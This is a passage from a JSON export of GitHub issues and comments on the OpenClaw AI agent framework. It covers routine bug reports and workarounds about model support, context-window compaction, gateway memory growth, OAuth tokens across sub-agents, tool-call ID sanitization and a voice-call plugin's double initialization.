          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3861405809",
          "createdAt": "2026-02-06T16:38:10Z",
          "updatedAt": "2026-02-06T16:39:02Z",
          "author": "dlalla",
          "body": "> Regarding **Codex 5.3**: I checked the updated `@mariozechner/pi-ai` v0.52.0 model catalog and I don't see Codex 5.3 listed in the OpenAI provider section. The workaround above works for Opus 4.6 because the library already has it, but Codex 5.3 may need to be added to the catalog first (either by the pi-ai maintainer or directly by the OpenClaw team).\n> \n> If anyone finds the exact model ID for Codex 5.3, it might be possible to add it manually to the same `models.generated.js` file — but that would require knowing the correct API parameters, pricing, and context window.\n\nIf you install Codex CLI and Claude CLI, your OpenClaw can spawn PTY sessions to execute your coding tasks since 5.3 Codex is available there, along with Opus 4.6... (works for me on Linux)"
        },
        {
          "id": 3861561840,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3861561840",
          "createdAt": "2026-02-06T17:01:03Z",
          "updatedAt": "2026-02-06T17:01:03Z",
          "author": "sebastienbo",
          "body": "dlalla: Don't you need another llm to spawn and control the PTY in the first place?\n\n"
        },
        {
          "id": 3862806354,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3862806354",
          "createdAt": "2026-02-06T22:15:38Z",
          "updatedAt": "2026-02-06T22:15:38Z",
          "author": "josscit",
          "body": "@sebastienbo That's exactly what's been happening here today! An OpenClaw agent (Gino, running on Opus 4.6) can now invoke Claude Code CLI directly.\n\nThe key: `exec (pty: true)` — OpenClaw's exec has built-in PTY support. Without it, `claude.exe -p` crashes (exit -1) because it requires a real terminal. With `pty: true`, it works first try.\n\n```\nexec (pty: true)\nclaude.exe -p \"your prompt\" --output-format text\n```\n\nSo yes, you need the LLM (OpenClaw) to control the PTY — it writes the prompt, spawns the CLI, and reads the output. No extra wrapper needed.\n\nOn WSL/Linux there were no issues at all. On Windows it took some debugging to figure out the PTY requirement, but as of today Claude Code CLI and OpenClaw talk to each other and collaborate really well.\n\nFirst test: Gino asked Claude Code CLI to write a Python script. No human wrote that code — an AI agent asked another AI agent to build it. 🐯💻"
        },
        {
          "id": 3862808615,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3862808615",
          "createdAt": "2026-02-06T22:16:21Z",
          "updatedAt": "2026-02-06T22:16:21Z",
          "author": "josscit",
          "body": "@sebastienbo Glad the workaround worked for you! And once you start using it, you'll notice the 1M context window is a total game changer. If OpenClaw was already great before, with Opus 4.6 it becomes absolutely atomic. 🦞🚀"
        },
        {
          "id": 3862838740,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3862838740",
          "createdAt": "2026-02-06T22:24:39Z",
          "updatedAt": "2026-02-06T22:38:54Z",
          "author": "josscit",
          "body": "@dlalla Thanks for the PTY suggestion. Just to clarify — the original issue here was about running OpenClaw *itself* on Opus 4.6 (changing its brain), not just calling Claude CLI as an external tool. That's what the workaround above solves.\n\nThat said, we also got the inter-agent communication working today with `exec (pty: true)` — so OpenClaw can now invoke Claude Code CLI directly. Works on Linux out of the box, on Windows the PTY option is needed."
        },
        {
          "id": 3864899321,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3864899321",
          "createdAt": "2026-02-07T17:24:31Z",
          "updatedAt": "2026-02-07T17:24:31Z",
          "author": "josscit",
          "body": "## ⚠️ CORRECTION: The 1M context window is NOT active with this workaround\n\nAfter a deep code-level investigation, I need to correct my earlier comment. The `models.generated.js` swap **does work** to make OpenClaw recognize Opus 4.6 — but the claimed \"1M token context window\" is **not actually active**. Here's why:\n\n### The problem: missing beta header\n\nThe Anthropic API enforces a **200,000 token hard limit** on Opus 4.6 by default. To unlock the 1M context window, the API request must include the beta header `context-1m-2025-08-07`.\n\n**Pi-ai does not send this header.** The only beta headers sent are:\n```\nanthropic-beta: fine-grained-tool-streaming-2025-05-14, interleaved-thinking-2025-05-14\n```\n\nSo even though `models.generated.js` declares `contextWindow: 1000000`, the API ignores this and enforces 200k. The catalog promises something the provider layer doesn't deliver.\n\n### Even if the header were sent: subscription limits apply\n\nPer [Anthropic's official docs](https://docs.anthropic.com/en/docs/about-claude/models):\n\n> For Opus 4.6, the 1M context window is available for API and Claude Code **pay-as-you-go** users. Pro, Max, Teams and Enterprise subscribers **do not have access** to Opus 4.6 1M context at launch.\n\nSo OAuth users (Pro/Max plans) are limited to 200k regardless.\n\n### What this causes: \"phantom\" compaction\n\nBecause OpenClaw's compaction thresholds are calculated against 1M (flush at ~965k, auto-compact at ~980k), they **never trigger**. The session grows until it hits the real 200k API limit, at which point:\n\n1. API returns HTTP 400: `\"prompt is too long: 202582 tokens > 200000 maximum\"`\n2. Pi detects this via `isContextOverflow()`\n3. Pi runs `_runAutoCompaction(\"overflow\", willRetry=true)` — an **emergency overflow recovery**\n4. Summary is generated, context is compacted, and the LLM call is retried\n\nThis is one of **3 compaction types in the Pi SDK** (`agent-session.js`):\n\n| Type | Trigger | When |\n|------|---------|------|\n| **Threshold** | `contextTokens > contextWindow - reserveTokens` | After successful turn, context too large |\n| **Overflow recovery** | API returns context overflow error (400) | After failed API call |\n| **Manual** | User runs `/compact` | On demand |\n\n**Note:** OpenClaw also adds its own compaction orchestration layer on top of the Pi SDK, with two modes: **\"default\"** (delegates to Pi SDK) and **\"safeguard\"** (OpenClaw's own chunked summarization). OpenClaw also manages a memory flush soft threshold and a `reserveTokensFloor` (20k by default). However, since all these thresholds are also calculated against the declared 1M context window, they suffer from the same misconfiguration — none of them trigger preventively either.\n\nWith the 1M misconfiguration, only overflow recovery ever fires — meaning every compaction is reactive (error-driven) rather than preventive. You lose a few seconds each time while Pi receives the error, compacts, and retries.\n\n### What the workaround actually gives you\n\n| Aspect | Works? |\n|--------|--------|\n| Make OpenClaw recognize Opus 4.6 | ✅ Yes |\n| Correct pricing/cost tracking | ✅ Yes |\n| Extended thinking (interleaved) | ✅ Yes |\n| 1M context window | ❌ **No** — hard 200k limit |\n| Preventive compaction thresholds | ❌ **No** — thresholds based on 1M, never trigger |\n\n### Recommended fix\n\nOpenClaw v2026.2.6 now supports Opus 4.6 natively. However, I haven't installed it yet to verify directly — from source code analysis of pi-ai v0.52.7 bundled with it, the `context-1m-2025-08-07` beta header is still not sent, and the `claude-opus-4-6` alias still declares `contextWindow: 1000000`. So the 1M issue likely persists even after upgrading.\n\nTo actually fix compaction thresholds, either:\n\n1. Use the dated model ID `claude-opus-4-6-20260205` which has `contextWindow: 200000` in pi-ai v0.52.3+\n2. Or override `contextWindow` to `200000` in your config to align compaction thresholds with reality\n\nThis ensures compaction fires **before** hitting the API limit (~180k) rather than **after** (error-driven at 200k).\n\n---\n\n🐛 **I've filed this as a dedicated bug report: #11292** — includes full technical details, compaction architecture reference, and suggested fixes.\n\n---\n\n*Found via source code analysis of `pi-ai/dist/providers/anthropic.js` (createClient function), `pi-coding-agent/dist/core/agent-session.js` (_checkCompaction / _runAutoCompaction), `openclaw/dist/extensionAPI.js` (compaction orchestration), and session JSONL forensics.*"
        },
        {
          "id": 3866914404,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3866914404",
          "createdAt": "2026-02-08T10:19:32Z",
          "updatedAt": "2026-02-08T10:19:32Z",
          "author": "sebastienbo",
          "body": "Be careful, it's not because a model can support a high context window that the quality is still good. \nUsually the quality is strongly impacted when your context grows. There are benchmarks that evaluate the model quality when the context grows, and you'll see that it can be disappointing sometimes. A model like opus 4.6 could behave like sonnet quality when the context is very large. \nI think I saw on the model card of gpt 5.2 this benchmark that measures context length output quality.\nSince Claude is new at long context (compared to gpt 5.2 and Gemini 3.0 and grok 4.1 ) it might be less qualitative in the beginning (until they fine tune it). That's why it is in beta status. And that's why I wouldn't use it yet\n"
        },
        {
          "id": 3867067880,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3867067880",
          "createdAt": "2026-02-08T12:04:57Z",
          "updatedAt": "2026-02-08T12:05:35Z",
          "author": "josscit",
          "body": "Good point @sebastienbo - Context length vs quality tradeoff is definitely worth watching. Thanks for the insight."
        },
        {
          "id": 3881788149,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10374#issuecomment-3881788149",
          "createdAt": "2026-02-11T02:37:38Z",
          "updatedAt": "2026-02-11T03:01:34Z",
          "author": "tag-assistant",
          "body": "Now that v2026.2.6 shipped with Opus 4.6 and Codex 5.3 support (nice work 🎉), wanted to flag that Anthropic just released **Claude Opus 4.6 Fast** (research preview, Feb 7).\n\nIt's the same Opus 4.6 model but with infrastructure tuned for ~2.5x faster token generation. GitHub Copilot already has it available for Pro+ and Enterprise users.\n\nCurrently trying to use it via OpenClaw returns `model not allowed: github-copilot/claude-opus-4.6-fast` — the model ID isn't in the allowlist yet.\n\nWould be great to add `claude-opus-4.6-fast` (or whatever the canonical ID ends up being) as a recognized model in the next release. Especially useful for sub-agent spawns where latency matters more than cost.\n\nReferences:\n- [Fast mode for Claude Opus 4.6 is now in preview for GitHub Copilot](https://github.blog/changelog/2026-02-07-claude-opus-4-6-fast-is-now-in-public-preview-for-github-copilot/)\n- [Claude Opus 4.6 GA for GitHub Copilot](https://github.blog/changelog/2026-02-05-claude-opus-4-6-is-now-generally-available-for-github-copilot/)"
        }
      ]
    },
    {
      "number": 13758,
      "title": "Gateway process accumulates memory and CPU over long sessions (69% CPU, 1.9GB RSS after 13h)",
      "body": "## Summary\n\nAfter ~13 hours of continuous operation, the openclaw-gateway process reaches **69.9% CPU** and **1.9GB RSS** (VmSize 24GB), becoming effectively stuck. The process remains functional (delivers Slack messages) but consumes excessive resources.\n\n## Environment\n- OpenClaw version: `2026.2.3-1`\n- OS: Amazon Linux 2023 (t3.medium, 4GB RAM)\n- Node.js: v22.**\n- Channel: Slack\n- Model: Bedrock Claude Opus 4.6\n\n## Reproduction Steps\n\n1. Run gateway for extended period (12+ hours) with active tool use (exec sessions, Claude Code child processes)\n2. Trigger conditions that cause LLM request timeouts (600s timeout, occurred 7 times in this incident)\n3. Have exec tool failures (e.g., `git checkout` failing due to uncommitted changes)\n4. Observe CPU gradually climbing and never recovering\n\n## Timeline of Events\n\n| Elapsed | Event |\n|---|---|\n| T+0h | Gateway running normally |\n| T+1h | ImportError in exec (child process) |\n| T+1.5h | First LLM timeout (600s) — embedded run timeout |\n| T+1.5h | Second LLM timeout (600s) — 2 lane errors |\n| T+2h | `git checkout` exec failure (uncommitted changes block checkout) |\n| T+2.25h | Third LLM timeout (600s) — 2 lane errors |\n| T+2.25h+ | Gateway continues operating but CPU stuck at ~70% |\n| T+13h | Still at 69.9% CPU, 563min CPU time, 1.9GB RSS |\n\n## Observed Behavior\n\n```\nELAPSED 13:26:42 | CPU 69.9% | RSS 1.9GB | VmSize 24GB | Threads 12\n```\n\n- Gateway still delivers Slack messages (not a total hang)\n- High CPU suggests V8 GC thrashing due to memory pressure\n- No automatic recovery mechanism\n- Child `claude` process (Claude Code CLI) runs under the gateway tree\n\n## Expected Behavior\n\n- Gateway should have memory limits / self-monitoring\n- After LLM timeouts, resources should be properly freed\n- Failed exec sessions should be cleaned up (no dangling state)\n- Consider: automatic restart when RSS exceeds a configurable threshold\n\n## Possible Root Causes\n\n1. **Memory leak on LLM timeout paths** — 600s timeout fires, but request context / conversation history may not be fully GC'd\n2. **Exec session cleanup** — failed exec (git checkout error) may leave internal state that prevents cleanup\n3. **No `--max-old-space-size` limit** — Node.js defaults to ~4GB heap on 64-bit, allowing unbounded growth\n4. **Long-running conversation context accumulation** — 13 hours of active sessions without compaction\n\n## Suggested Improvements\n\n1. Set `--max-old-space-size` (e.g., 1536MB) to bound heap growth\n2. Add periodic memory self-check — if RSS > threshold, log warning or trigger graceful restart\n3. Ensure LLM timeout error paths properly release conversation buffers\n4. Add exec session reaping for sessions in error state\n\n## Logs\n\n```\n[diagnostic] lane task error: lane=main durationMs=600463 error=\"FailoverError: LLM request timed out.\"\n[tools] exec failed: error: Your local changes to the following files would be overwritten by checkout:\n[agent/embedded] embedded run timeout: timeoutMs=600000\n```\n\n\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13758",
      "createdAt": "2026-02-11T00:34:12Z",
      "updatedAt": "2026-02-11T03:00:18Z",
      "author": "niceysam",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881703182,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13758#issuecomment-3881703182",
          "createdAt": "2026-02-11T02:03:36Z",
          "updatedAt": "2026-02-11T02:03:36Z",
          "author": "echoVic",
          "body": "## Analysis\n\nI reviewed the gateway source code and identified several potential contributing factors to the memory growth:\n\n### 1. Session Manager Cache (likely primary cause)\n\n`src/agents/pi-embedded-runner/session-manager-cache.ts` — Session managers are cached in memory for performance. In long-running sessions with heavy tool use, these caches accumulate conversation history, tool results, and context that may not be properly evicted.\n\n### 2. Exec Session State\n\n`src/agents/pi-embedded-runner/runs.ts` — `ACTIVE_EMBEDDED_RUNS` Map tracks active runs. Failed exec sessions (e.g., git checkout errors) may leave entries that aren't properly cleaned up, especially when the run errors out mid-tool-execution.\n\n### 3. LLM Timeout Error Path\n\nWhen a 600s timeout fires (`embedded run timeout`), the abort path calls `runAbortController.abort()` and `activeSession.abort()`, but the conversation buffer and tool result payloads from the timed-out request may not be fully released. The `messagesSnapshot` captured before cleanup could hold references to large tool results.\n\n### 4. Subscription State\n\n`pi-embedded-subscribe.ts` — The subscription tracks `assistantTexts`, `toolMetas`, and streaming state. If `unsubscribe()` isn't called cleanly on timeout, these can leak.\n\n### Suggested Improvements\n\n1. **`--max-old-space-size=1536`** — Set via `NODE_OPTIONS` in the gateway start script to bound heap growth. This is the simplest immediate fix.\n\n2. **Periodic RSS self-check** — Add a timer in the gateway boot sequence that checks `process.memoryUsage().rss` every 5 minutes. If RSS exceeds a configurable threshold (e.g., `gateway.maxRssMb: 1536`), log a warning and optionally trigger a graceful restart.\n\n3. **Session manager cache eviction** — Add TTL-based eviction for cached session managers. Sessions idle for >30 minutes should be evicted from the cache.\n\n4. **Exec session cleanup on error** — Ensure failed exec sessions are properly reaped. The `clearActiveEmbeddedRun` path should be audited for error cases.\n\n### Quick Win\n\nThe simplest improvement would be adding `--max-old-space-size` and an RSS watchdog. I can submit a PR for this if the maintainers agree with the approach.\n\n/cc @mariozechner"
        },
        {
          "id": 3881853496,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13758#issuecomment-3881853496",
          "createdAt": "2026-02-11T03:00:18Z",
          "updatedAt": "2026-02-11T03:00:18Z",
          "author": "didier1803work-wq",
          "body": "Closing per reporter request."
        }
      ]
    },
    {
      "number": 13826,
      "title": "Antigravity Claude: unsigned thinking blocks cause multi-turn rejection",
      "body": "## Bug Description\n\nWhen using Claude models via Google Antigravity (`google-antigravity/claude-sonnet-4-5`), multi-turn conversations with tool calls fail with:\n\n```\nLLM request rejected: messages.N.content.0.thinking.signature: Field required\n```\n\n## Root Cause\n\nTwo issues combine to cause this:\n\n1. **Google Antigravity returns thinking blocks without `thinking_signature`**, even when `thinkingLevel` is set to `\"off\"`. The response contains `{\"type\":\"thinking\",\"thinking\":\"...\"}` but no signature field.\n\n2. **`sanitizeAntigravityThinkingBlocks` only runs once per user turn** (in `sanitizeSessionHistory`), cleaning up *prior* messages. But within the same turn, when the agent loop processes tool calls, the *current* assistant response (with unsigned thinking blocks) is sent back to the API via `convertToLlm` — which passes assistant messages through as-is (`case \"assistant\": return m`).\n\n## Reproduction Steps\n\n1. Configure OpenClaw with `google-antigravity/claude-sonnet-4-5` as primary model\n2. Send a message that triggers a tool call (e.g., cron list, file read, etc.)\n3. First API call succeeds, returns assistant message with thinking block (no signature)\n4. Agent executes the tool, sends tool result back → **second API call fails** because the assistant message at `messages[1]` has an unsigned thinking block\n\n## Code Flow\n\n```\nagent-loop.js: streamAssistantResponse()\n  → API returns assistant with thinking block (no signature)\n  → stored directly in context.messages\n\nagent-loop.js: runLoop() → tool execution → next streamAssistantResponse()\n  → config.convertToLlm(context.messages)     ← passes assistant through as-is\n  → messages[1].content[0] has thinking block without signature\n  → API rejects: \"thinking.signature: Field required\"\n```\n\n## Suggested Fix\n\nThe sanitization should also happen at the `convertToLlm` boundary (in `pi-coding-agent/dist/core/messages.js`), not just in `sanitizeSessionHistory`. For `assistant` messages, strip content blocks where `type === \"thinking\"` but no valid signature exists (`thinkingSignature`, `signature`, `thought_signature`, `thoughtSignature`).\n\nThis is a safe general fix — unsigned thinking blocks will always be rejected by the API, so stripping them at the conversion layer is correct regardless of provider.\n\n## Workaround\n\nWe mount a patched `messages.js` via Docker volume that adds `stripUnsignedThinkingBlocks()` to the `convertToLlm` function's `\"assistant\"` case. Details: https://github.com/AliceLJY/openclaw-worker/commit/6dd73fd\n\n## Environment\n\n- OpenClaw: v2026.2.9 (Docker `ghcr.io/openclaw/openclaw:latest`)\n- Model: `google-antigravity/claude-sonnet-4-5`\n- Provider: Google Antigravity\n- `pi-agent-core`: 0.52.9\n- `pi-coding-agent`: (bundled with OpenClaw image)\n\n## Related Files\n\n- `/app/src/agents/pi-embedded-runner/google.ts` — `sanitizeAntigravityThinkingBlocks()` (lines 48-110)\n- `/app/src/agents/pi-embedded-runner/run/attempt.ts` — `sanitizeSessionHistory` call (line 543)\n- `/app/node_modules/@mariozechner/pi-coding-agent/dist/core/messages.js` — `convertToLlm()` \n- `/app/node_modules/@mariozechner/pi-agent-core/dist/agent-loop.js` — `streamAssistantResponse()`",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13826",
      "createdAt": "2026-02-11T02:42:29Z",
      "updatedAt": "2026-02-11T02:49:45Z",
      "author": "AliceLJY",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881821687,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13826#issuecomment-3881821687",
          "createdAt": "2026-02-11T02:49:44Z",
          "updatedAt": "2026-02-11T02:49:44Z",
          "author": "juboyy",
          "body": "Mainly in the subagents "
        }
      ]
    },
    {
      "number": 12685,
      "title": "[Bug] OpenAI Codex OAuth: config mode/type mismatch + token not synced to non-main agents",
      "body": "## Summary\nOpenAI Codex OAuth auth can break in multi-agent setups due to **two distinct issues**:\n\n1. **Config mode/type mismatch handling is asymmetric** and silently rejects valid OAuth credentials in legacy/mismatched config states.\n2. **OAuth re-auth tokens are not synced to non-main agents**, so sub-agents keep stale/invalidated tokens.\n\nCombined, this causes sub-agents spawned by non-main agents to fail authentication and silently fall back to a different model.\n\n---\n\n## Issue 1: Config `mode` / credential `type` mismatch\n\nIn `auth-profiles` (`dist`, around line ~2630), `resolveApiKeyForProfile` checks:\n\n```ts\nif (profileConfig.mode !== cred.type) return null\n```\n\nThere is an exception for `mode=oauth + type=token`, but not the inverse.\n\n### Observed problematic state\n- `openclaw.json` has `auth.profiles.\"openai-codex:default\".mode = \"token\"`\n- `auth-profiles.json` has `profiles.\"openai-codex:default\".type = \"oauth\"`\n\nThis causes the credential to be silently rejected.\n\n### Important context\n- Current onboarding code (in `onboard-skills`, around line ~1907) now writes `mode: \"oauth\"` correctly.\n- So this appears to be a bug from an older onboarding path/version that persisted in existing configs.\n\n### Why this still matters\nEven if onboarding is now fixed, existing users with persisted `mode: \"token\"` + `type: \"oauth\"` are still broken unless they manually repair config.\n\n---\n\n## Issue 2: OAuth token refresh not propagated to non-main agents\n\nWhen running:\n\n```bash\nopenclaw onboard --auth-choice openai-codex\n```\n\na fresh OAuth token is written only to the **main agent** `auth-profiles.json`.\n\nNon-main agents (e.g. `work`, `group`) keep stale/invalidated tokens.\n\nThere is fallback logic in `auth-profiles` (around line ~2694):\n\n```ts\nconst mainCred = ensureAuthProfileStore(void 0).profiles[profileId]\n```\n\nBut in practice this fallback only helps when local cred is **expired**, not when token is still time-valid but **invalidated server-side**.\n\nResult: users must manually copy tokens from main auth store to each non-main agent store.\n\n---\n\n## Evidence\n- OpenClaw version: `2026.2.6-3`\n- 13+ silent failures since Feb 8, all from `agent:work` sub-agents\n- Error before mode fix:\n  - `FailoverError: No API key found for provider \"openai-codex\"`\n- Error after mode fix (before token sync/refresh handling):\n  - `FailoverError: Your authentication token has been invalidated`\n- Sub-agents silently fell back to `kimi-coding/k2p5` instead of `openai-codex/gpt-5.3-codex`\n- Main agent direct model switch worked fine (different path)\n\n---\n\n## Reproduction\n1. Set up OpenClaw with multiple agents (main + work).\n2. Authenticate with OpenAI Codex OAuth.\n3. Ensure config has `auth.profiles.\"openai-codex:default\".mode = \"token\"` (legacy onboarding state or manual mismatch).\n4. Ensure auth store has `profiles.\"openai-codex:default\".type = \"oauth\"`.\n5. Spawn a sub-agent from a non-main agent with `model: \"openai-codex/gpt-5.3-codex\"`.\n6. Sub-agent fails auth and silently falls back to first available fallback model.\n\n---\n\n## Expected behavior\n- OAuth credentials should resolve robustly for legacy-compatible mode/type combinations.\n- Re-auth should refresh OAuth credentials across all agent auth stores (or enforce a single source of truth).\n- Main->agent inheritance should recover when token is server-invalidated, not only when expired.\n- Auth failure should not silently degrade to unrelated fallback model without clear surfacing.\n\n## Actual behavior\n- Credential can be rejected due to `mode/token` vs `type/oauth` mismatch.\n- Re-auth updates only main agent token.\n- Non-main agents continue failing until manual token sync.\n- Sub-agents silently model-fallback.\n\n---\n\n## Suggested fixes\n1. **`resolveApiKeyForProfile`**\n   - Add bidirectional compatibility exception:\n     - allow `mode=token + type=oauth` (in addition to existing `mode=oauth + type=token`).\n2. **Onboarding re-auth propagation**\n   - When refreshing OpenAI Codex OAuth token, write/sync to all agent auth stores (main + non-main).\n3. **Inheritance fallback behavior**\n   - Trigger main→agent credential inheritance for server-invalidated tokens as well, not only expired tokens.\n\n---\n\n## Environment\n- OpenClaw: `2026.2.6-3`\n- OS: macOS Darwin `25.2.0` (arm64)\n- Node: `v25.6.0`\n- Auth mode: OAuth (`openai-codex:default`)\n- Agents: `main` (default), `group`, `work`\n\n---\n\n## Workarounds\n1. Manually edit `openclaw.json`: `mode: \"token\"` → `mode: \"oauth\"` for `openai-codex:default`.\n2. After re-auth, manually copy fresh token from main agent `auth-profiles.json` into non-main agent auth stores.\n\n---\n\n## Related (adjacent but distinct)\n- #12003 — OpenAI API key not persisted (API key path, different provider/mechanism)\n- #10928 — Cron jobs hardcode main agent auth (agentDir issue)\n- #12004 (PR) — persist OpenAI API key (different mechanism)\n- #9997, #12310 (PRs) — pass agentDir to embedded runner (related surface, different root cause)\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12685",
      "createdAt": "2026-02-09T13:45:58Z",
      "updatedAt": "2026-02-11T02:47:36Z",
      "author": "mudrii",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "onboarding",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881816793,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12685#issuecomment-3881816793",
          "createdAt": "2026-02-11T02:47:36Z",
          "updatedAt": "2026-02-11T02:47:36Z",
          "author": "jagguvarma15",
          "body": "hey @thewilloftheshadow,  #12003 #12004 are on this same issue. I have a solution to this bug could you check and respond (if you're a maintainer)."
        }
      ]
    },
    {
      "number": 13799,
      "title": "sanitizeToolCallIds excludes Anthropic, causing persistent tool_use.id format errors",
      "body": "## Summary\n\n`sanitizeToolCallIds` in `transcript-policy.ts` only enables tool call ID sanitization for Google and Mistral providers, not Anthropic. This causes the Anthropic API to reject requests when tool_use IDs contain characters outside `^[a-zA-Z0-9-]+$` (e.g., underscores in `toolu_01XYZ` style IDs from other providers or synthetic results).\n\nThe error manifests as:\n```\nLLM request rejected: messages.370.content.1.tooluse.id: String should match pattern '^[a-zA-Z0-9-]+$'\n```\n\nThe gateway logs \"Tool calls will be sanitized on retry\" but no sanitization actually runs for Anthropic, causing a loop or silent failure.\n\n## Root Cause\n\nIn the compiled output (and presumably `transcript-policy.ts`):\n\n```typescript\nconst sanitizeToolCallIds = isGoogle || isMistral;\n```\n\nAnthropic is missing. The `sanitizeToolCallIdsForCloudCodeAssist()` function exists and works correctly — it's just never called for Anthropic requests because the flag is `false`.\n\n## Fix\n\n```diff\n- const sanitizeToolCallIds = isGoogle || isMistral;\n+ const sanitizeToolCallIds = isGoogle || isMistral || isAnthropic;\n```\n\nThis appears in 4 dist files: `extensionAPI.js`, `loader-*.js`, `pi-embedded-*.js`, `reply-*.js`.\n\nThe existing `\"strict\"` mode (alphanumeric only) satisfies Anthropic's `^[a-zA-Z0-9-]+$` pattern. No other changes needed.\n\n## Prior Art\n\n- #2769 — Identical bug report and fix, closed during triage without being addressed\n- #6740 — Ongoing issue with the same root cause (non-responsive agent after format error)\n- #8434 — Format error cascading to auth cooldown, also caused by this\n\n## Environment\n\n- OpenClaw 2026.2.9\n- macOS arm64 (Darwin 24.6.0)\n- Model: anthropic/claude-opus-4-5 via `anthropic:claude-work` auth profile\n\n## Workaround\n\nManually patch the 4 dist files as described above. Survives until next `npm update`.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13799",
      "createdAt": "2026-02-11T02:02:07Z",
      "updatedAt": "2026-02-11T02:46:17Z",
      "author": "gsiener",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3881812707,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13799#issuecomment-3881812707",
          "createdAt": "2026-02-11T02:46:17Z",
          "updatedAt": "2026-02-11T02:46:17Z",
          "author": "lailoo",
          "body": "I addressed this issue in PR #13831\nIf you have some time, I'd really appreciate it if you could take a look.\n---\n**Fix:** Add `isAnthropic` and `isOpenRouterAnthropic` to `sanitizeToolCallIds` in `transcript-policy.ts`, so Anthropic and OpenRouter Claude models get tool call ID sanitization (strict alphanumeric mode).\n"
        }
      ]
    },
    {
      "number": 13769,
      "title": "Feature: Add Claude Opus 4.6 model support",
      "body": "## Summary\nAdd Claude Opus 4.6 (claude-opus-4-6) as an available model option.\n\n## Problem\nClaude Opus 4.6 is a newer model variant but isn't available in the model selection.\n\n## Proposed Solution\nAdd `anthropic/claude-opus-4-6` to the model catalog with appropriate alias support (e.g. `opus46`).\n\n## Notes\n- Should work with existing Anthropic auth profiles\n- May need context window / pricing updates in model metadata",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13769",
      "createdAt": "2026-02-11T01:05:45Z",
      "updatedAt": "2026-02-11T02:37:42Z",
      "author": "danieljmnewton",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3881788814,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13769#issuecomment-3881788814",
          "createdAt": "2026-02-11T02:37:42Z",
          "updatedAt": "2026-02-11T02:37:42Z",
          "author": "howardpark",
          "body": "it's already there"
        }
      ]
    },
    {
      "number": 13823,
      "title": "Voice Call plugin initializes twice per SIGUSR1 restart, causing state mismatch",
      "body": "## Description\n\nThe voice-call plugin initializes twice during a SIGUSR1-triggered gateway restart. The second initialization creates a new runtime instance with empty state (call records, stream auth tokens, webhook URL maps), while the first instance's state is lost. This causes:\n\n1. **Media stream token rejection**: The first instance generates auth tokens for calls, but the second instance's `shouldAcceptStream` callback rejects them because its token map is empty\n2. **Missing call records**: `getCallByProviderCallId()` returns null on the second instance for calls initiated by the first\n3. **No initial message playback**: The `call.answered` event handler on the second instance can't find the call record, so `speakInitialMessage` never fires\n\n## Symptoms\n\n- Outbound calls in **conversation mode** connect but immediately hang up (stream rejected) or stay silent (no initial message played)\n- **Notify mode works** because it pre-bakes TwiML inline — no cross-instance state needed\n- Gateway logs show `[voice-call] Runtime initialized` appearing **twice** per restart\n- Warning: `duplicate plugin id detected; later plugin may be overridden` (even with only one copy of the plugin on disk)\n\n## Logs (sanitized)\n\n```\n[voice-call] Runtime initialized          # First init\n[voice-call] Runtime initialized          # Second init overwrites state\n[voice-call] Starting max duration timer   # Timer fires twice (both instances)\n[voice-call] Starting max duration timer   # Confirms double processing\n[MediaStream] Twilio connected\n[MediaStream] Stream started: MZxxx (call: CAxxx)\n[voice-call] Rejecting media stream: invalid token for CAxxx   # Second instance rejects\n[MediaStream] Rejecting stream for unknown call: CAxxx\n```\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Plugin source: built-in (`/extensions/voice-call/`)\n- Provider: Twilio with Media Streams\n- Exposure: Tailscale Funnel\n- macOS, Node v25.5.0\n\n## Steps to Reproduce\n\n1. Configure voice-call plugin with streaming enabled and a Twilio provider\n2. Start the gateway\n3. Trigger a SIGUSR1 restart (e.g., via `config.patch`)\n4. Initiate an outbound call in conversation mode\n5. Observe two `Runtime initialized` messages in logs\n6. Call connects but media stream is rejected with `invalid token`\n\n## Expected Behavior\n\nThe plugin should initialize exactly once per restart cycle, or the second initialization should inherit/migrate state from the first.\n\n## Workaround\n\nDisabling streaming (`streaming.enabled: false`) and using notify mode avoids the state mismatch, but loses bidirectional conversation capability.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13823",
      "createdAt": "2026-02-11T02:36:25Z",
      "updatedAt": "2026-02-11T02:36:25Z",
      "author": "markclawbot",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
